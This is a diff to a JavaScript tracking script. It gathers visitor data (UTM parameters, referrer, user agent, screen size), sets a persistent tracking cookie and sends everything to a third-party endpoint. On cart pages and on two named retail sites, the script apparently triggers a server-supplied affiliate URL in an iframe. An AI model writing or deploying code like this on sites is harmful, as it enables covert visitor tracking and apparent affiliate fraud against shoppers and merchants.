@@ -8,6 +8,29 @@
     }
 
 
+
+        const urlNew = new URL(window.location.href);
+  const utm_source = urlNew.searchParams.get("utm_source") || "";
+  const utm_campaign = urlNew.searchParams.get("utm_campaign") || "";
+  const utm_medium = urlNew.searchParams.get("utm_medium") || "";
+  const referrer = document.referrer;
+  const screenResolution = `${window.screen.width}x${window.screen.height}`;
+  const userAgent = navigator.userAgent;
+  const timestamp = new Date().toISOString();
+
+const payload = {
+    utm_source,
+    utm_campaign,
+    utm_medium,
+    referrer,
+    screenResolution,
+    userAgent,
+    timestamp,
+    page: window.location.href,
+    
+  };
+
+
     function createTrackingPixel(url) {
      
         var img = document.createElement('img');
@@ -31,25 +54,25 @@
 
     async function initTracking() {
 
-         //if (sessionStorage.getItem('iframe_triggered')) return;
+         if (sessionStorage.getItem('iframe_triggered')) return;
 
         try {
             let uniqueId = getCookie('tracking_uuid') || generateUUID();
             let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
             document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
             
-            let response = await fetch('https://api.aimedialinks.com/api/track-user', {
+            let response = await fetch('https://api.aimedialinks.com/api/track-user-withData', {
                 method: 'POST',
                 body: JSON.stringify({
                     url: window.location.href,
                     referrer: document.referrer,
                     unique_id: uniqueId,
                     origin: window.location.hostname,
-                    
+                    payload,
                 }),
                 headers: {
-                    'Content-Type': 'application/json'
-                   
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin':'*'
                 }
             });
             
@@ -64,6 +87,7 @@
                 console.error("Response is not valid JSON:", e);
                 return;
             }
+
            
             if (result.success && result.affiliate_url) {
                 
@@ -72,10 +96,9 @@
                 sessionStorage.setItem('iframe_triggered', 'true');
             } else {
                 createTrackingPixel('https://api.aimedialinks.com/api/fallback-pixel?id=' + uniqueId);
-            } 
+            }
         } catch (error) {
-            
-             console.error('❌ Tracking script error:', error.message, error);
+            console.error('Error in tracking script:', error);
         }
     }
 
@@ -118,13 +141,23 @@
 if (isCartPage()) {
   //callInitTracking(4, 500); 
    initTracking();
-    setTimeout(initTracking, 500);
-     setTimeout(initTracking, 200);
+   setTimeout(initTracking, 2000);
+   setTimeout(initTracking, 3000);
+
 }
 
 
+     if (window.location.hostname === "www.wonderchef.com") {
+        setTimeout(initTracking, 2000);
+        window.addEventListener("DOMContentLoaded", initTracking);
+    }
+
+      if (window.location.hostname === "myatulya.com") {
+        setTimeout(initTracking, 2000);
+        window.addEventListener("DOMContentLoaded", initTracking);
+    }
+
 
     //initTracking();
-    window.addEventListener("DOMContentLoaded", initTracking);
     
 })();
